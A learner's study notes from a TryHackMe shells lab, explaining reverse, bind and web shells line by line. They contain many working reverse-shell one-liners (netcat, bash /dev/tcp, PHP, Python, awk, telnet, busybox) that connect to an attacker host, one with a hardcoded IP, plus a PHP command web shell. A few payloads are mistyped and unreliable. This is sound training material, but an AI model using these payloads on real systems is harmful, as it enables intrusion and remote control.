(a recap since it's a fresh year - again, I will organise all this 'stuff' in this somewhat book at some stage...)
Many thanks to THM Lab https://tryhackme.com/r/room/shellsoverview

Remote shelling allows several 'things' from an attack perspective:
- Remote System Control
	- Gives the attacker the ability to execute commands or software remotely in the target system
- Privilege Escalation
	- If the initial remote session through a shell is limited/restricted - the attacker(s) can explore ways to escalate privileges to more elevated or administrative access
- Data Exfiltration 
	- Once the adversaries have access to execute commands through an obtained shell, they can then explore the system to read, and perhaps copy sensitive data from it
- Persistence and Maintenance Access
	- Once shell access is gained, attackers could then create access through users and credentials or copy backdoor software to maintain access to the target system for later usage
- Post-Exploitation Activities
	- Once shell access is gained, adversaries can perform a range of post-exploitation activities - ie, deploying malware, creating hidden accounts, and deleting information
- Access Other Systems on the Network
	- Depending on what intent the attacker(s) have, the obtained shell could just be an initial access point. The end game goal or focus could be to hop through the network on to different hosts or target machines using the obtained shell as a pivot to different points in the compromised systems network. 
		- Pivoting

Reverse Shell (aka Connect Back Shell)
- Connection initiates from the target system back to the attackers machine
- Can assist in avoiding detection from network firewalls and other security appliances
	- Netcat Tool
		- Supports multiple OSs and allows reading and writing through a network
		- The attacker's machine will have netcat (`nc`) listening on a local port
			- ie `nc -lvnp 443`
			- `nc -help` for more information or `man nc`
		- Any port can be used, however, it could be intended to use a more commonly used port so as to blend in to seem like the outbound connection if pointing towards something legitimate
		- Gaining a Reverse Shell
			- A reverse shell payload would have to be executed
				- This usually abuses the vulnerability or unauthorised access granted by the attacker and executes a command that will expose the shell through the network
				- Here are some: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
			- An example:
				- `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <attackers_ip> <attackers_port> >/tmp/f`
				- `rm -f /tmp/f`
					- Removes any existing named pipe located at /tmp/f/
					- This ensures that the script can create a new named pipe without any other files conflicting with it
					- `mkfifo /tmp/f`
						- Creates a named pipe, or FIFO (first-in, first-out) at `/tmp/f`
						- Named pipes allow for two-way communication between processes
						- In this instance, it acts as a conduit for input and output
					- `cat /tmp/f`
						- reads data from the named pipe
					- `| sh -i 2>&1`
						- the output of the above cat read, is piped into a shell instance (`bash -i`). This will allow the perpetrator to execute commands interactively
						- The `2>&1` redirects standard error to standard output, so that they go back to the attacker remotely (otherwise the errors wouldn't get to them)
					- `| nc <attackers_ip> <attackers_port> >/tmp/f`
						- Pipes the shell's output through netcat (`nc`) to the attackers ip-address:port 
						- `>/tmp/f`
							- This part sends the output of the commands back into the named pipe, allowing for bi-directional communication
				- That's an example of a reverse shell payload

Bind Shell
- Connection initiates from the attackers machine to the target machine
- The bind shell will bind a port on the target system and listen for a connection
- When the connection comes in, it will expose the shell session so that the attacker can run their commands remotely
- This alternative to the Remote Shell can be used when the target computer/system doesn't allow outbound connections - but it tends to be less popular since it needs to remain active and listen for connections, which can lead to detection. 
- Example:
	- On the target machine:
	- `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`
		- `rm -f /tmp/f`
			- Removes any existing named pipe at `/tmp/f/` (to ensure that a new one can be created, and there won't be any butting of heads - metaphorically speaking)
		- `mkfifo /tmp/f`
			- Creates a new named pipe, or FIFO, at `/tmp/f`
			- Remember this is going to be the conduit, the 'pipe' between the target-machine and the attacking-machine
		- `cat /tmp/f`
			- Reads data from the newly created named pipe.
			- It waits for input that can be sent through the pipe
		- `| bash -i 2>&1`
			- The output of cat is piped into a shell instance (`bash -i`) - this will allow the attacker to run commands interactively
			- Remember that `2>&1` will redirect 'Standard Error' to 'Standard Output' - thus ensuring that the attacking machine can see any errors that the shell may encounter
		- `| nc -l 0.0.0.0 8080`
			- Starts netcat in listen mode (this is on the target-machine remember) on port 8080
		- `>/tmp/f`
			- Sends commands' output back into the named pipe, allowing for that bidirectional communication to happen
	- On the attackers machine:
	- `nc -nv <target_ip> 8080`
		- `nc` 
			- Invokes netcat
			- `-n` 
				- Disables DNS resolution
			- `-v`
				- Verbose mode to print out details of the connection process, ie when it gets established
			- `<target_ip>`
				- Speaks for itself
			- `8080`
				- the targets port number
	- That's an example of a Bind Shell
	- Note: port numbers below 1024 will need root or privileged permissions.

Shell Listeners
- `rlwrap`
	- A utility that uses the GNU readline library to provide editing keyboard and history
	- `rlwrap nc -lvnp 443`
		- `rlwrap` wraps `nc` allowing now the use of features like arrow keys and history for better interaction
- `ncat`
	- An improved version of Netcat distrubted by the NMAP project
	- Provides extra features, like encryption! (SSL)
	- `ncat -lvnp 4444`
		- When listening for a revshell
	- `ncat --ssl -lvnp 4444`
		- When listening for a revshell with SSL
- `socat`
	- Allows one to create a socket connection between two data sources, two hosts
	- `socat -d -d TCP-LISTEN:443 STDOUT`
		- `-d` enables version output
		- Using it again increases verbosity of the commands
		- `TCP-LISTEN:443` create a TCP listener on 443
		- Establishing a server socket for incoming connections
		- `STDOUT`
			- Directs any incoming data to the terminal
	- There are many more things you can do with `socat` - creating a more stable connection and the rest (described in another part of this 'book')

Shell Payloads
- A Shell Payload can be a command or a script that will expose the shell to an incoming connection in the case of a Bind Shell being considered, or a send connection in the case of a Reverse Shell. 
- Normal Bash Reverse Shell
	- `bash -i >& /dev/tcp/<attacker_ip>/443 0>&1`
		- Initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP on port 443
		- the `>&` combines both standard output and standard error
- Bash Read Line Reverse Shell
	- `exec 5<>/dev/tcp/<attacker_ip>/443; cat <&5 | while read line; do $line 2>&5 >&5; done`
		- This shell creates a NEW file descriptor (`5` in this instance) and connects to a TCP socket
		- It will then read and execute commands from the socket, sending the output back through the same socket
- Bash with File Descript 196 Reverse Shell
	- `0<&196;exec 196<>/dev/tcp/<attacker_ip>/443; sh <&196 >&196 2>&196`
		- Uses a file descriptor (`196` in this instance) to establish a TCP connection
		- It will allow the shell to read commands from the network and send output back through the same connection
- Bash with File Descriptor 5 Reverse Shell
- `bash -i 5<> /dev/tcp/<attacker_ip>/443 0<&5 1>&5 2>&5`
	- Similar to the previous file descript 5 example
	- This command will open a shell (`bash -i`), using file descriptor `5` for input and output, enabling an interactive session over the TCP connection

PHP
- PHP Reverse Shell Using the `exec` Function
	- `php -r '$sock=fsockopen("<attacker_ip>",443);exec("sh <&3 >&3 2>&3);'`
		- NOTE: Not sure if double-quotes are needed around the attacker-ip parameter or not.. Need to test this one
		- This shell creates a socket connection to the attackers IP on port 443 and uses the `exec` function to execute a shell, redirecting standard input and output (as well as with errors I think?)
- PHP Reverse Shell Using the `shell_exec` Function
	- `php -r '%sock=fsockopen("<attacker_ip",443);shell_exec("sh <&3 >&3 2>&3");'`
	- Similar to the previous shell, but using the `shell_exec` function
- PHP Reverse Shell Using the `system` Function
	- `php -r '$sock=fsockopen("<attacker_ip>",443);system("sh <&3 >&3 2>&3");'`
		- This revshell uses the `system` function which executes the command and outputs the result to the browser
- PHP Reverse Shell Using the `passthru` Function
	- `php -r '$sock=fsockopen("<attacker_ip>",443);passthru("sh <&3 >&3 2>&3");'`
		- `passthru` executes a command and sends raw output back to the browser. This is useful when working with binary data
- PHP Reverse Shell Using the `popen` Function
	- `php -r '$sock=fsockopen("<attacker_ip>",443);popen("sh <&3 >&3 2>&3", "r");'`
		- `popen` opens a process file pointer, allowing the shell to be executed

Python
- Python Reverse Shell by Exporting Environment Variables
	```python
	export RHOST="<attacker_ip>"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")
	```
	- This revshell sets the remote host and port as environment variables
	- Then creates a socket connection, and duplicates the socket file descriptor for standard input/output
- Python Reverse Shell Using the Subprocess Module
	```python
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
	```
	- This shell uses the `subpocess` module to spawn a shell and set up a similar environment as the revshell just above
	- Apparently the `subprocess` module is commonly used to manage shell command and establishing reverse shell connections in security assessments
- Short Python Reverse Shell
	```python
	python -c 'import os,pty,socket;s=socket.socket();s.connect(("<attacker_ip>",443));[os.dup2(s.fileno(),f)for f in (0,1,2)];pty.spawn("bash")'
	```
	- This revshell creates a socket (`s`), then connects to the attacker, redirecting standard input, output and error to the socket using `os.dup2()`

Other Shells
- Telnet
	```shell
	TF=$(mktemp -u); mkfifo $TF && telnet <attacker_ip>443 0<$TF | sh 1>$TF
	```
	- This Revshell creates a named pipe (`mkfifo`) and connectso the attacker via Telnet on `<attacker_ip>` and port `443` 
		- Not sure if there's supposed to be a gap between the att_ip and port 
			- need to test, but it's Telnet... lel
- AWK
	```shell
	awk 'BEGIN {s = "/inet/tcp/0/<attacker_ip>/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
	```
	- This Revshell uses AWK's built-in TCP capabilities to connect to the attackers IP and Port.
	- It reads commands from the attacker and executes them, it then sends the results back over the same TCP connection
- BusyBox
	- `busybox nc <attacker_ip> 443 -e sh`
		- This BusyBox revshell uses Netcat to conect to the attacker at the attackers IP address and port. 
		- Once connected, it executes `/bin/sh`, thus exposing the command line to the attacker

Web Shells
- A web shell is a script written in a language supported by a compromised web-server that will execute commands through the web-server itself. 
- A Web Shell is usually a file containing code that executes commands and handles files. 
- It can be hidden within a compromised web-application or service - which can make it difficult to detect and popular among attackers. 
- Languages:
	- PHP
	- ASP
	- JSP
	- Simple CGI scripts
- PHP Web Shell Example:
	```php
	<?php
	if (isset($_GET['cmd'])) {
	system($_GET['cmd']);
	}
	?>
	```
	- This code would be saved in a .php file, like `webshell.php` (or something less blatant :P )
	- It would then be uploaded onto the web-server by the attacker via exploiting vulnerabilities like:
		- Unrestricted File Upload
		- File Inclusion
		- Command Injection
		- and others
		- Or by gaining unauthorised access to the web-server somehow
	- After the webshell is placed on to the web-server, it can be accessed through the URL where it could be found on the web-server. 
		- ie `http://buggered.com/uploads/webshell.php`
	- The attacker will need to provide a GET method and the value for the variable `cmd` (which should contain the command the attacker wants to execute). 
	- For example, if we wanted to run a `whoami` :
		- `http://buggered.com/uploads/shell.php?cmd=whoami`
			- This will execute `whoami` on the web-server and display it on the web-browser
- Existing Web Shells Online:
	- p0wny-shell
		- Minimalistic single-file PHP web shell that allows remote code execution
	- b374k shell
		- A more feature-rich PHP web shell with file management and command execution, amongst other functionalities
	- c99 shell
		- A well-known and robust PHP web shell with extensive functionality
		- 